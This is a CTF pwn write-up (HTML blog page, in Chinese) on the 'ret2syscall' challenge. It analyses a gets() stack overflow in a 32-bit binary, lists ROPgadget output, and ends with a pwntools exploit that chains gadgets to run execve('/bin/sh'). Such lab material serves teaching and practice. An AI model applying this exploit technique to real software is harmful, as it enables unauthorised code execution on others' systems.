@@ -1,0 +1,338 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ret2syscall | Re1own's blog</title><meta name="keywords" content="PWN,CTF,ret2syscall"><meta name="author" content="Re1own"><meta name="copyright" content="Re1own"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="漏洞分析题目ret2syscall 查看保护，开启了NX保护，不能ret2shellcode 12345678┌──(root💀e267254b2ec9)-[&#x2F;home&#x2F;ret2sys]└─# checksec rop [*] &amp;#x27;&#x2F;home&#x2F;ret2sys&#x2F;rop&amp;#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2syscall">
+<meta property="og:url" content="https://re1own.github.io/2021/12/09/ret2syscall/index.html">
+<meta property="og:site_name" content="Re1own&#39;s blog">
+<meta property="og:description" content="漏洞分析题目ret2syscall 查看保护，开启了NX保护，不能ret2shellcode 12345678┌──(root💀e267254b2ec9)-[&#x2F;home&#x2F;ret2sys]└─# checksec rop [*] &amp;#x27;&#x2F;home&#x2F;ret2sys&#x2F;rop&amp;#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-12-09T01:51:32.000Z">
+<meta property="article:modified_time" content="2021-12-09T02:08:44.000Z">
+<meta property="article:author" content="Re1own">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="ret2syscall">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/51265145?v=4"><link rel="canonical" href="https://re1own.github.io/2021/12/09/ret2syscall/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?3578e6b9b604a5b4194133e82a05cfe3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=3079589108"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', '3079589108');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ret2syscall',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-09 10:08:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Re1own's blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://avatars.githubusercontent.com/u/51265145?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">25</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">18</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Re1own's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">ret2syscall</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-12-09T01:51:32.000Z" title="Created 2021-12-09 09:51:32">2021-12-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-12-09T02:08:44.000Z" title="Updated 2021-12-09 10:08:44">2021-12-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ret2syscall"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="ret2syscall">题目ret2syscall</a></p>
+<p>查看保护，开启了NX保护，不能ret2shellcode</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/ret2sys]</span><br><span class="line">└─<span class="comment"># checksec rop </span></span><br><span class="line">[*] <span class="string">&#x27;/home/ret2sys/rop&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>反汇编主函数，很显然gets会导致栈溢出，v4相对于ebp的偏移量为108字节，需要覆盖的返回地址距离v4的偏移量为112字节</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反汇编后没发现有system可以直接调用，没法ret2text，并且发现通过puts泄露地址去猜libc也不太适用，因为程序中有它自己写的puts函数，没法泄露和计算libc的加载基地址</p>
+<p><img src="https://s2.loli.net/2021/12/09/RkT5AvYybeJ3qaE.png" alt="image-20211209091500843"></p>
+<p>此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。采取使用ret2syscall即控制程序执行系统调用，获取 shell。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="关于系统调用"><a href="#关于系统调用" class="headerlink" title="关于系统调用"></a>关于系统调用</h3><h4 id="系统调用介绍"><a href="#系统调用介绍" class="headerlink" title="系统调用介绍"></a>系统调用介绍</h4><p>Linux 在x86上的系统调用通过 int 80h 实现，用系统调用号（在 <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> 和 <em>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</em> 分别可以查看 64 位和 32 位的系统调用号。）来区分入口函数。操作系统实现系统调用的基本过程是：</p>
+<ol>
+<li>应用程序调用库函数（API）；</li>
+<li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li>
+<li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li>
+<li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li>
+<li>中断处理函数返回到 API 中；</li>
+<li>API 将 EAX 返回给应用程序。</li>
+</ol>
+<p>应用程序调用系统调用的过程是：</p>
+<ol>
+<li>把系统调用的编号存入 EAX；</li>
+<li>把函数参数存入其它通用寄存器；</li>
+<li>触发 0x80 号中断（int 0x80）。</li>
+</ol>
+<h4 id="如何使用系统调用"><a href="#如何使用系统调用" class="headerlink" title="如何使用系统调用"></a>如何使用系统调用</h4><p>这里列出几个典型的系统调用号，具体更多的可以参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gsharpsh00ter/p/6402104.html">Linux系统调用号 - gsharpsh00ter - 博客园 (cnblogs.com)</a></p>
+<p>Linux在用int 0x80进行系统调用时，调用号存在于EAX，第一个参数存在于EBX，第二个参数存在于ECX，第三个参数存在于EDX</p>
+<table>
+<thead>
+<tr>
+<th><strong>%eax</strong></th>
+<th><strong>Name</strong></th>
+<th><strong>Source</strong></th>
+<th><strong>%ebx</strong></th>
+<th><strong>%ecx</strong></th>
+<th><strong>%edx</strong></th>
+<th><strong>%esx</strong></th>
+<th><strong>%edi</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>sys_exit</td>
+<td>kernel/exit.c</td>
+<td>int</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>2</td>
+<td>sys_fork</td>
+<td>arch/i386/kernel/process.c</td>
+<td><a target="_blank" rel="noopener" href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#pt_regs">struct pt_regs</a></td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>3</td>
+<td>sys_read</td>
+<td>fs/read_write.c</td>
+<td>unsigned int</td>
+<td>char *</td>
+<td><a target="_blank" rel="noopener" href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t">size_t</a></td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>4</td>
+<td>sys_write</td>
+<td>fs/read_write.c</td>
+<td>unsigned int</td>
+<td>const char *</td>
+<td><a target="_blank" rel="noopener" href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t">size_t</a></td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>5</td>
+<td>sys_open</td>
+<td>fs/open.c</td>
+<td>const char *</td>
+<td>int</td>
+<td>int</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>6</td>
+<td>sys_close</td>
+<td>fs/open.c</td>
+<td>unsigned int</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>7</td>
+<td>sys_waitpid</td>
+<td>kernel/exit.c</td>
+<td>pid_t</td>
+<td>unsigned int *</td>
+<td>int</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>8</td>
+<td>sys_creat</td>
+<td>fs/open.c</td>
+<td>const char *</td>
+<td>int</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>9</td>
+<td>sys_link</td>
+<td>fs/namei.c</td>
+<td>const char *</td>
+<td>const char *</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>10</td>
+<td>sys_unlink</td>
+<td>fs/namei.c</td>
+<td>const char *</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>11</td>
+<td>sys_execve</td>
+<td>arch/i386/kernel/process.c</td>
+<td><a target="_blank" rel="noopener" href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#pt_regs">struct pt_regs</a></td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+</tbody></table>
+<p>此次利用中，我们第一个参数是/bin/sh，其实sh的地址也ok，后面的参数都是空也就是0，换作寄存器就是ebx指向/bin/sh的地址，ecx，edx等于0    </p>
+<p><code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p>
+<h3 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h3><p>首先要让eax = 0xb，那么需要找的指令是pop eax，但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，所以pop之后还需要一个ret返回到控制程序执行流</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/ret2sys]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span></span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
+
+<p>选择<code>0x080bb196 : pop eax ; ret</code></p>
+<p>类似的，我们可以得到控制其它寄存器的 gadgets</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/ret2sys]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span></span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>选择<code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code>（这个可以直接控制其它三个寄存器。）</p>
+<p>此外，我们需要获得 /bin/sh 字符串对应的地址。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/ret2sys]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; </span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/ret2sys]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary rop  --only &#x27;int&#x27;        </span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sh = process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line">    pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">    pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">    int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">    binsh = <span class="number">0x80be408</span></span><br><span class="line">    payload = flat(</span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>打通！</p>
+<p><img src="https://s2.loli.net/2021/12/09/YXwrMnkpJFdamcq.png"></p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gsharpsh00ter/p/6402104.html">Linux系统调用号 - gsharpsh00ter - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">基本 ROP - CTF Wiki (ctf-wiki.org)</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Re1own</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://re1own.github.io/2021/12/09/ret2syscall/">https://re1own.github.io/2021/12/09/ret2syscall/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/ret2syscall/">ret2syscall</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://i.loli.net/2021/10/21/syOvRWB2DejXGZc.png" target="_blank"><img class="post-qr-code-img" src="https://i.loli.net/2021/10/21/syOvRWB2DejXGZc.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://i.loli.net/2021/10/21/FKSPZJviGNdp4Y1.png" target="_blank"><img class="post-qr-code-img" src="https://i.loli.net/2021/10/21/FKSPZJviGNdp4Y1.png" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/12/10/Apache-log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Apache-log4j漏洞复现</div></div></a></div><div class="next-post pull-right"><a href="/2021/12/08/ret2shellcode/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">ret2shellcode</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2020/11/24/PWN-pwnable-kr-fd/" title="PWN-pwnable.kr.fd"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-24</div><div class="title">PWN-pwnable.kr.fd</div></div></a></div><div><a href="/2020/11/24/PWN-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E6%A3%80%E6%B5%8B/" title="PWN-格式化字符串-攻防世界_实时数据检测"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-24</div><div class="title">PWN-格式化字符串-攻防世界_实时数据检测</div></div></a></div><div><a href="/2020/11/24/PWN-64%E4%BD%8DROP-Bugku-PWN4/" title="PWN-64位ROP-Bugku_PWN4"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-24</div><div class="title">PWN-64位ROP-Bugku_PWN4</div></div></a></div><div><a 